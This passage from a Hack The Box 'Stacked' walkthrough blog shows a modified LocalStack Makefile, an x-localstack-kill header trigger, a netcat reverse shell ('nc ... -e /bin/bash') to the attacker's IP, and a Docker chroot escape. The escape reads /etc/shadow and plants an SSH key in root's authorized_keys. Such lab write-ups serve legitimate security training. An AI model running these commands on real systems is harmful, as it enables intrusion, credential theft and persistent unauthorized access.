`pwd`/localstack/services:/opt/code/localstack/localstack/services -v `pwd`/localstack/dashboard:/opt/code/localstack/localstack/dashboard -v `pwd`/tests:/opt/code/localstack/tests -v $<span class="variable">$MOTO_DIR</span>:/opt/code/localstack/.venv/lib/python3.8/site-packages/moto/&quot;</span> make docker-run</span><br><span class="line"></span><br><span class="line">vagrant-start:</span><br><span class="line">        @vagrant up || EXIT_CODE=$$? ;\</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$EXIT_CODE</span>&quot;</span> != <span class="string">&quot;0&quot;</span> ]; <span class="keyword">then</span>\</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;Predicted error. Ignoring...&quot;</span>;\</span><br><span class="line">                vagrant ssh -c <span class="string">&quot;sudo yum install -y epel-release &amp;&amp; sudo yum update -y &amp;&amp; sudo yum -y install wget perl gcc gcc-c++ dkms kernel-devel kernel-headers make bzip2&quot;</span>;\</span><br><span class="line">                vagrant reload --provision;\</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">vagrant-stop:</span><br><span class="line">        vagrant halt</span><br><span class="line"></span><br><span class="line">docker-build-light:</span><br><span class="line">        @img_name=$(IMAGE_NAME_LIGHT); \</span><br><span class="line">                docker build -t $<span class="variable">$img_name</span> -f bin/Dockerfile.light .; \</span><br><span class="line">                IMAGE_NAME=$<span class="variable">$img_name</span> IMAGE_TAG=latest make docker-squash; \</span><br><span class="line">                docker tag $<span class="variable">$img_name</span>:latest $<span class="variable">$img_name</span>:$(IMAGE_TAG)</span><br><span class="line"></span><br><span class="line">docker-cp-coverage:</span><br><span class="line">        @<span class="built_in">echo</span> <span class="string">&#x27;Extracting .coverage file from Docker image&#x27;</span>; \</span><br><span class="line">                <span class="built_in">id</span>=$$(docker create localstack/localstack); \</span><br><span class="line">                docker <span class="built_in">cp</span> $<span class="variable">$id</span>:/opt/code/localstack/.coverage .coverage; \</span><br><span class="line">                docker <span class="built_in">rm</span> -v $<span class="variable">$id</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># deprecated - TODO remove</span></span><br><span class="line">web:</span><br><span class="line">        ($(VENV_RUN); bin/localstack web)</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>:              <span class="comment">## Run automated tests</span></span><br><span class="line">        make lint &amp;&amp; \</span><br><span class="line">                ($(VENV_RUN); DEBUG=$(DEBUG) PYTHONPATH=`<span class="built_in">pwd</span>` nosetests $(NOSE_ARGS) --with-timer --with-coverage --logging-level=WARNING --nocapture --no-skip --exe --cover-erase --cover-tests --cover-inclusive --cover-package=localstack --with-xunit --exclude=<span class="string">&#x27;$(VENV_DIR).*&#x27;</span> --ignore-files=<span class="string">&#x27;lambda_python3.py&#x27;</span> $(TEST_PATH))</span><br><span class="line"></span><br><span class="line">test-docker:</span><br><span class="line">        ENTRYPOINT=<span class="string">&quot;--entrypoint=&quot;</span> CMD=<span class="string">&quot;make test&quot;</span> make docker-run</span><br><span class="line"></span><br><span class="line">test-docker-mount: <span class="comment">## Run automated tests in Docker (mounting local code)</span></span><br><span class="line">        ENTRYPOINT=<span class="string">&quot;-v `pwd`/tests:/opt/code/localstack/tests&quot;</span> make test-docker-mount-code</span><br><span class="line"></span><br><span class="line">test-docker-mount-code:</span><br><span class="line">        MOTO_DIR=$$(<span class="built_in">echo</span> $$(<span class="built_in">pwd</span>)/.venv/lib/python*/site-packages/moto | awk <span class="string">&#x27;&#123;print $$NF&#125;&#x27;</span>); \</span><br><span class="line">        ENTRYPOINT=<span class="string">&quot;--entrypoint= -v `pwd`/localstack/config.py:/opt/code/localstack/localstack/config.py -v `pwd`/localstack/constants.py:/opt/code/localstack/localstack/constants.py -v `pwd`/localstack/utils:/opt/code/localstack/localstack/utils -v `pwd`/localstack/services:/opt/code/localstack/localstack/services -v `pwd`/Makefile:/opt/code/localstack/Makefile -v $<span class="variable">$MOTO_DIR</span>:/opt/code/localstack/.venv/lib/python3.8/site-packages/moto/ -e TEST_PATH=<span class="subst">$(TEST_PATH)</span> -e NOSE_ARGS=-v -e LAMBDA_JAVA_OPTS=<span class="subst">$(LAMBDA_JAVA_OPTS)</span> <span class="subst">$(ENTRYPOINT)</span>&quot;</span> CMD=<span class="string">&quot;make test&quot;</span> make docker-run</span><br><span class="line"></span><br><span class="line">reinstall-p2:      <span class="comment">## Re-initialize the virtualenv with Python 2.x</span></span><br><span class="line">        <span class="built_in">rm</span> -rf $(VENV_DIR)</span><br><span class="line">        PIP_CMD=pip2 VENV_OPTS=<span class="string">&quot;-p &#x27;`which python2`&#x27;&quot;</span> make install</span><br><span class="line"></span><br><span class="line">reinstall-p3:      <span class="comment">## Re-initialize the virtualenv with Python 3.x</span></span><br><span class="line">        <span class="built_in">rm</span> -rf $(VENV_DIR)</span><br><span class="line">        PIP_CMD=pip3 VENV_OPTS=<span class="string">&quot;-p &#x27;`which python3`&#x27;&quot;</span> make install</span><br><span class="line"></span><br><span class="line">lint:              <span class="comment">## Run code linter to check code style</span></span><br><span class="line">        ($(VENV_RUN); flake8 --inline-quotes=single --show-source --max-line-length=120 --ignore=E128,W504 --exclude=node_modules,$(VENV_DIR)*,dist,fixes .)</span><br><span class="line"></span><br><span class="line">clean:             <span class="comment">## Clean up (npm dependencies, downloaded infrastructure code, compiled Java classes)</span></span><br><span class="line">        <span class="built_in">rm</span> -rf localstack/dashboard/web/node_modules/</span><br><span class="line">        <span class="built_in">rm</span> -rf localstack/infra/amazon-kinesis-client</span><br><span class="line">        <span class="built_in">rm</span> -rf localstack/infra/elasticsearch</span><br><span class="line">        <span class="built_in">rm</span> -rf localstack/infra/elasticmq</span><br><span class="line">        <span class="built_in">rm</span> -rf localstack/infra/dynamodb</span><br><span class="line">        <span class="built_in">rm</span> -rf localstack/node_modules/</span><br><span class="line">        <span class="built_in">rm</span> -rf $(VENV_DIR)</span><br><span class="line">        <span class="built_in">rm</span> -f localstack/utils/kinesis/java/com/atlassian/*.class</span><br><span class="line"></span><br><span class="line">.PHONY: usage compile clean install web install-web infra <span class="built_in">test</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0$ wget http://10.10.14.4/Makefile -O Makefile</span><br><span class="line">Connecting to 10.10.14.4 (10.10.14.4:80)</span><br><span class="line">saving to <span class="string">&#x27;Makefile&#x27;</span></span><br><span class="line">Makefile             100% |********************************|  8489  0:00:00 ETA</span><br><span class="line"><span class="string">&#x27;Makefile&#x27;</span> saved</span><br></pre></td></tr></table></figure>

<p>Open another terminal and start a netcat listener to your reverse shell port.<br>Do:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:8080/ -H <span class="string">&quot;x-localstack-kill: anything&quot;</span></span><br></pre></td></tr></table></figure>

<p>or:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:4566/ -H <span class="string">&quot;x-localstack-kill: anything&quot;</span></span><br></pre></td></tr></table></figure>

<p>on the container shell.</p>
<p>And I got a shell. and the user.txt flag.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># nc -lvp 3344                                                                                                                    </span></span><br><span class="line">Ncat: Version 7.92 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::3344</span><br><span class="line">Ncat: Listening on 0.0.0.0:3344</span><br><span class="line">Ncat: Connection from 10.10.11.112.</span><br><span class="line">Ncat: Connection from 10.10.11.112:37651.</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">bash-5.0<span class="comment"># ^Z</span></span><br><span class="line">[1]+  Stopped                 nc -lvp 3344</span><br><span class="line"></span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># stty raw -echo                                                                                                                  </span></span><br><span class="line"></span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">nc -lvp 3344                                                                                                                        </span><br><span class="line">            reset</span><br><span class="line">bash-5.0<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br><span class="line">bash-5.0<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">bash-5.0<span class="comment"># find / -name &quot;user.txt&quot; 2&gt;/dev/null</span></span><br><span class="line">/home/localstack/user.txt</span><br><span class="line">bash-5.0<span class="comment"># cat /home/localstack/user.txt</span></span><br><span class="line">c877918fc5f7cb38e0631f7849c20b1b</span><br></pre></td></tr></table></figure>

<p>And we are root of the container.</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2148.jpg"></li>
</ul>
<h1 id="root"><a href="#root" class="headerlink" title="root"></a>root</h1><p>After looking around for a way to escape the container, I see a bunch of docker certificate.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0<span class="comment"># docker images</span></span><br><span class="line">docker images</span><br><span class="line">REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">localstack/localstack-full   0.12.6              7085b5de9f7c        6 months ago        888MB</span><br><span class="line">localstack/localstack-full   &lt;none&gt;              0601ea177088        12 months ago       882MB</span><br><span class="line">lambci/lambda                nodejs12.x          22a4ada8399c        12 months ago       390MB</span><br><span class="line">lambci/lambda                nodejs10.x          db93be728e7b        12 months ago       385MB</span><br><span class="line">lambci/lambda                nodejs8.10          5754fee26e6e        12 months ago       813MB</span><br><span class="line">bash-5.0<span class="comment"># ls -la .docker/</span></span><br><span class="line"><span class="built_in">ls</span> -la .docker/</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Jul 17  2021 .</span><br><span class="line">drwxr-x---    1 root     root          4096 Jul 19  2021 ..</span><br><span class="line">-rw-------    1 root     root          3326 Jul 17  2021 ca-key.pem</span><br><span class="line">-rw-r--r--    1 root     root          2159 Jul 17  2021 ca.pem</span><br><span class="line">-rw-r--r--    1 root     root            41 Jul 17  2021 ca.srl</span><br><span class="line">-rw-r--r--    1 root     root          1899 Jul 17  2021 cert.pem</span><br><span class="line">-rw-r--r--    1 root     root          1582 Jul 17  2021 client.csr</span><br><span class="line">-rw-r--r--    1 root     root            30 Jul 17  2021 extfile-client.cnf</span><br><span class="line">-rw-r--r--    1 root     root           111 Jul 17  2021 extfile.cnf</span><br><span class="line">-rw-------    1 root     root          3243 Jul 17  2021 key.pem</span><br></pre></td></tr></table></figure>

<p>running docker images command and docker container ls -a return</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0<span class="comment"># docker container ls -a</span></span><br><span class="line">docker container <span class="built_in">ls</span> -a</span><br><span class="line">CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS                      PORTS                                                                                                  NAMES</span><br><span class="line">86099318c53b        localstack/localstack-full:0.12.6   <span class="string">&quot;docker-entrypoint.sh&quot;</span>   11 minutes ago      Up 11 minutes               127.0.0.1:443-&gt;443/tcp, 127.0.0.1:4566-&gt;4566/tcp, 127.0.0.1:4571-&gt;4571/tcp, 127.0.0.1:8080-&gt;8080/tcp   localstack_main</span><br><span class="line">d76e9ebac9d7        0601ea177088                        <span class="string">&quot;docker-entrypoint...&quot;</span>   6 months ago        Exited (130) 6 months ago                                                                                                          condescending_babbage</span><br></pre></td></tr></table></figure>

<p>Looking back at Recon section above, there is one port I haven‚Äôt look at.<br>Visiting the port on browser.<br>We need to use https.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://stacked.htb:2376</span><br></pre></td></tr></table></figure>

<p>So the certificate is used by docker to authenticate.</p>
<p>I try to run the second localstack container that has Image ID 0601ea177088 and mount<br>the real machine to &#x2F;host directory of the container.<br>First I need to open another terminal and give a reverse shell to that terminal by running</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 10.10.14.4 1234 -e /bin/bash &amp;</span><br></pre></td></tr></table></figure>

<p>on the container root shell.</p>
<p>Now I have two root terminal.</p>
<p>Now let‚Äôs run the second localstack container that has Image ID 0601ea177088 on first terminal.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0<span class="comment"># docker run -it -v /:/host/ 0601ea177088 chroot /host bash</span></span><br><span class="line">Waiting <span class="keyword">for</span> all LocalStack services to be ready</span><br><span class="line">2022-02-14 07:13:35,073 CRIT Supervisor is running as root.  Privileges were not dropped because no user is specified <span class="keyword">in</span> the config file.  If you intend to run as root, you can <span class="built_in">set</span> user=root <span class="keyword">in</span> the config file to avoid this message.</span><br><span class="line">2022-02-14 07:13:35,079 INFO supervisord started with pid 14</span><br><span class="line">2022-02-14 07:13:36,082 INFO spawned: <span class="string">&#x27;dashboard&#x27;</span> with pid 20</span><br><span class="line">2022-02-14 07:13:36,085 INFO spawned: <span class="string">&#x27;infra&#x27;</span> with pid 21</span><br><span class="line">2022-02-14 07:13:36,092 INFO success: dashboard entered RUNNING state, process has stayed up <span class="keyword">for</span> &gt; than 0 seconds (startsecs)</span><br><span class="line">(. .venv/bin/activate; bin/localstack web)</span><br><span class="line">(. .venv/bin/activate; <span class="built_in">exec</span> bin/localstack start --host)</span><br><span class="line">2022-02-14 07:13:37,098 INFO success: infra entered RUNNING state, process has stayed up <span class="keyword">for</span> &gt; than 1 seconds (startsecs)</span><br><span class="line">Waiting <span class="keyword">for</span> all LocalStack services to be ready</span><br><span class="line">LocalStack version: 0.12.6</span><br><span class="line">Starting <span class="built_in">local</span> dev environment. CTRL-C to quit.</span><br><span class="line">LocalStack version: 0.12.6</span><br><span class="line">Waiting <span class="keyword">for</span> all LocalStack services to be ready</span><br><span class="line">[2022-02-14 07:13:51 +0000] [26] [INFO] Running on https://0.0.0.0:8081 (CTRL + C to quit)</span><br><span class="line">2022-02-14T07:13:51:INFO:hypercorn.error: Running on https://0.0.0.0:8081 (CTRL + C to quit)</span><br><span class="line">Starting edge router (https port 4566)...</span><br><span class="line">Starting mock ACM service on http port 4566 ...</span><br><span class="line">Starting mock API Gateway service on http port 4566 ...</span><br><span class="line">Starting mock CloudFormation service on http port 4566 ...</span><br><span class="line">Starting mock CloudWatch service on http port 4566 ...</span><br><span class="line">Starting mock DynamoDB service on http port 4566 ...</span><br><span class="line">Starting mock DynamoDB Streams service on http port 4566 ...</span><br><span class="line">Starting mock EC2 service on http port 4566 ...</span><br><span class="line">Starting mock ES service on http port 4566 ...</span><br><span class="line">Starting mock Firehose service on http port 4566 ...</span><br><span class="line">Starting mock IAM service on http port 4566 ...</span><br><span class="line">Starting mock STS service on http port 4566 ...</span><br><span class="line">Starting mock Kinesis service on http port 4566 ...</span><br><span class="line">Starting mock KMS service on http port 4566 ...</span><br><span class="line">2022-02-14T07:13:52:INFO:localstack.multiserver: Starting multi API server process on port 37199</span><br><span class="line">[2022-02-14 07:13:52 +0000] [22] [INFO] Running on https://0.0.0.0:4566 (CTRL + C to quit)</span><br><span class="line">2022-02-14T07:13:52:INFO:hypercorn.error: Running on https://0.0.0.0:4566 (CTRL + C to quit)</span><br><span class="line">[2022-02-14 07:13:52 +0000] [22] [INFO] Running on http://0.0.0.0:37199 (CTRL + C to quit)</span><br><span class="line">2022-02-14T07:13:52:INFO:hypercorn.error: Running on http://0.0.0.0:37199 (CTRL + C to quit)</span><br><span class="line">Starting mock Lambda service on http port 4566 ...</span><br><span class="line">Starting mock CloudWatch Logs service on http port 4566 ...</span><br><span class="line">Starting mock Redshift service on http port 4566 ...</span><br><span class="line">Starting mock Route53 service on http port 4566 ...</span><br><span class="line">Starting mock S3 service on http port 4566 ...</span><br><span class="line">Starting mock Secrets Manager service on http port 4566 ...</span><br><span class="line">Starting mock SES service on http port 4566 ...</span><br><span class="line">Starting mock SNS service on http port 4566 ...</span><br><span class="line">Starting mock SQS service on http port 4566 ...</span><br><span class="line">Starting mock SSM service on http port 4566 ...</span><br><span class="line">Starting mock Cloudwatch Events service on http port 4566 ...</span><br><span class="line">Starting mock StepFunctions service on http port 4566 ...</span><br><span class="line">Waiting <span class="keyword">for</span> all LocalStack services to be ready</span><br><span class="line">Waiting <span class="keyword">for</span> all LocalStack services to be ready</span><br><span class="line">Waiting <span class="keyword">for</span> all LocalStack services to be ready</span><br><span class="line">Waiting <span class="keyword">for</span> all LocalStack services to be ready</span><br><span class="line">Ready.</span><br><span class="line">2022-02-14T07:14:17:INFO:localstack.utils.analytics.profiler: Execution of <span class="string">&quot;start_api_services&quot;</span> took 24456.59899711609ms</span><br></pre></td></tr></table></figure>

<p>On the second terminal find the newly created CONTAINER ID by running docker container ls -a grep the latest one.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0<span class="comment"># docker container ls -a</span></span><br><span class="line">CONTAINER ID        IMAGE                               COMMAND                  CREATED              STATUS                      PORTS                                                                                                  NAMES</span><br><span class="line">aedd99d3bdfd        0601ea177088                        <span class="string">&quot;docker-entrypoint...&quot;</span>   About a minute ago   Up About a minute           4566/tcp, 4571/tcp, 8080/tcp                                                                           romantic_bartik</span><br><span class="line">493f53db650e        localstack/localstack-full:0.12.6   <span class="string">&quot;docker-entrypoint.sh&quot;</span>   About an hour ago    Up About an hour            127.0.0.1:443-&gt;443/tcp, 127.0.0.1:4566-&gt;4566/tcp, 127.0.0.1:4571-&gt;4571/tcp, 127.0.0.1:8080-&gt;8080/tcp   localstack_main</span><br><span class="line">d76e9ebac9d7        0601ea177088                        <span class="string">&quot;docker-entrypoint...&quot;</span>   6 months ago         Exited (130) 6 months ago                                                                                                          condescending_babbage</span><br></pre></td></tr></table></figure>

<p>aedd99d3bdfd is the latest CONTAINER ID<br>Now run this on the second terminal.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it aedd99d3bdfd /bin/bash</span><br></pre></td></tr></table></figure>

<p>The real machine is mounted in &#x2F;host directory.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0<span class="comment"># docker exec -it aedd99d3bdfd /bin/bash</span></span><br><span class="line">bash-5.0<span class="comment"># cat /host/root/root.txt </span></span><br><span class="line">bd97095c84e01bc86ec04f08be824f38</span><br><span class="line">bash-5.0<span class="comment"># cat /host/etc/shadow | grep root</span></span><br><span class="line">root:$6$F1hSt8DMC1lSDosl<span class="variable">$9kkppjsnuUeN</span>.tVdrU0JB8diyM.nPbcDx4BGJUJ42NNTTa8bCezvAwYtxJnHcIA.m1.nW29uKwYOD7H/BJTp7.:18828:0:99999:7:::</span><br></pre></td></tr></table></figure>

<p>I can put my public key to &#x2F;host&#x2F;root&#x2F;.ssh&#x2F;authorized_keys so I can login using ssh.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash-5.0<span class="comment"># echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDu7aGOBi/YxmmQyU2tlLE9SyykK3nD1e2xad0dLeu3jqOf0x5MGJrg1pjll/llxJl+Xuj01MVtMeV35ggrFatTx/+feDngc81Ml6CxhOcKhrNDdJCFlG1hjMjEw+ouvb04S/RKWQivhogu54aGH6HK6gsqYqL1ZvmANADlCqHtvNnFyshxHZbNJn6EQakPApeLF3n+JZU1P7szzHOc6a/y8W8k4FHqPqjPz6XsjQ3bNa052g3J6eMhV/467njx86tCES47hOFb0UdOLg29DG3u7WFG+zaDDDXudgGMSMUwaz8EWwjxY3rlQl649veu4SMIrc9GIaQChwjr4XeSaY5e0X1EDP2kUq9R9TkJCYM1qp9+iNw9e7q4Qfejeb+6mEuSPBf1G5P5UqWUWUf3KJjPeiXcgfYJoiLzZlC1Ui5r6si5D/LTOLp97xLronrnBIGs8Elr26Qv39S4Kb6llI4LsvApZNKlKb/4N6dcb/nyVawfpsMksEqBy9aM1M8/gh8= root@kali&quot; &gt; /host/root/.ssh/authorized_keys</span></span><br></pre></td></tr></table></figure>

<p>Now I can ssh login as root using pwned private key.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># chmod 600 id_rsa</span></span><br><span class="line"></span><br><span class="line">‚îå‚îÄ‚îÄ(rootüíÄkali)-[~/hackthebox/machine/stacked]</span><br><span class="line">‚îî‚îÄ<span class="comment"># ssh -i id_rsa root@10.10.11.112</span></span><br><span class="line">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-84-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Mon 14 Feb 07:19:30 UTC 2022</span><br><span class="line"></span><br><span class="line">  System load:              0.0</span><br><span class="line">  Usage of /:               88.4% of 7.32GB</span><br><span class="line">  Memory usage:             42%</span><br><span class="line">  Swap usage:               0%</span><br><span class="line">  Processes:                268</span><br><span class="line">  Users logged <span class="keyword">in</span>:          0</span><br><span class="line">  IPv4 address <span class="keyword">for</span> docker0: 172.17.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> ens160:  10.10.11.112</span><br><span class="line">  IPv6 address <span class="keyword">for</span> ens160:  dead:beef::250:56ff:feb9:72bb</span><br><span class="line"></span><br><span class="line">  =&gt; / is using 88.4% of 7.32GB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: sudo apt update</span><br><span class="line"></span><br><span class="line">Last login: Tue Sep 14 16:00:29 2021</span><br><span class="line">root@stacked:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@stacked:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@stacked:~<span class="comment"># cat root.txt </span></span><br><span class="line">bd97095c84e01bc86ec04f08be824f38</span><br><span class="line">root@stacked:~<span class="comment"># cat /etc/shadow | grep root</span></span><br><span class="line">root:$6$F1hSt8DMC1lSDosl<span class="variable">$9kkppjsnuUeN</span>.tVdrU0JB8diyM.nPbcDx4BGJUJ42NNTTa8bCezvAwYtxJnHcIA.m1.nW29uKwYOD7H/BJTp7.:18828:0:99999:7:::</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2149.jpg"></li>
</ul>
<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
<li>gobuster and ffuf dir and vhost fuzz</li>
<li>use LocalStack RCE and header Referer xss to get a reverse shell</li>
<li>privesc through x-localstack-kill request header</li>
<li>get root by using docker chroot mount</li>
</ul>
<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I‚Äôm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more‚Ä¶</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>lUc1f3r11
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2022/02/14/stacked/" title="Hack-The-Box-walkthrough[stacked]">https://fdlucifer.github.io/2022/02/14/stacked/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
